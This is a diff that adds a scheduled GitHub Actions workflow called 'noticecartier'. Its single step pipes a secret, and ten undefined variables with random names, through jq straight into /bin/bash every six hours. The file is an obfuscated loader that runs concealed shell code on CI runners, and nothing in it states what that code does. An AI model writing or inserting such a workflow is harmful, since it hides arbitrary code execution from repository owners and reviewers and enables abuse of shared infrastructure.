@@ -1,0 +1,27 @@
+name: noticecartier
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: noticecartier
+        env:
+          qj4149: ${{ secrets.qj4149 }}
+        run: |
+          echo $qj4149 | jq -r .btifq19 | /bin/bash
+          echo $ekzd93 | jq -r .ivz91380 | /bin/bash
+          echo $cpe09 | jq -r .m117 | /bin/bash
+          echo $douhl96433 | jq -r .mznox750 | /bin/bash
+          echo $cme370 | jq -r .zztxl4368 | /bin/bash
+          echo $n3849 | jq -r .jege8994 | /bin/bash
+          echo $vuejy49173 | jq -r .im9 | /bin/bash
+          echo $xtaw78 | jq -r .uvr92 | /bin/bash
+          echo $p51106 | jq -r .ll8057 | /bin/bash
+          echo $fd034 | jq -r .r6 | /bin/bash
+          echo $o0043 | jq -r .oay85 | /bin/bash
+
